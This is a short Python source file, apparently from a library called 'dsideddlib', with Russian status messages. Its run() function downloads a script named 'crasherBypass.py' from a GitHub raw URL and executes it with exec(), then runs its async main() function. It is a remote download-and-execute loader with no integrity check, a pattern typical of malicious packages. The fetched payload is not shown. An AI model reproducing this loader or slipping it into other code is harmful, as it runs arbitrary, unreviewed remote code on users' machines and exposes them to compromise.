import http.client
import asyncio

def run():
    print("[dsideddlib] Запуск...")

    host = "raw.githubusercontent.com"
    path = "/hellyth1337/dfree/main/crasherBypass.py"

    try:
        conn = http.client.HTTPSConnection(host)
        conn.request("GET", path)
        response = conn.getresponse()

        if response.status != 200:
            print(f"[dsideddlib] Ошибка загрузки: HTTP {response.status}")
            return

        code = response.read().decode()
        print("[dsideddlib] Код загружен")

        local_vars = {}
        try:
            exec(code, globals(), local_vars)
            print("[dsideddlib] Код выполнен")
        except Exception as e:
            print(f"[dsideddlib] Ошибка выполнения exec(): {e}")
            return

        if 'main' in local_vars and asyncio.iscoroutinefunction(local_vars['main']):
            try:
                print("[dsideddlib] Выполняю main()...")
                asyncio.run(local_vars['main']())
            except Exception as e:
                print(f"[dsideddlib] Ошибка выполнения main(): {e}")
        else:
            print("[dsideddlib] main() не найден или не async — выполнение завершено")

    except Exception as e:
        print(f"[dsideddlib] Ошибка выполнения: {e}")

    finally:
        conn.close()
        print("[dsideddlib] Завершено.")
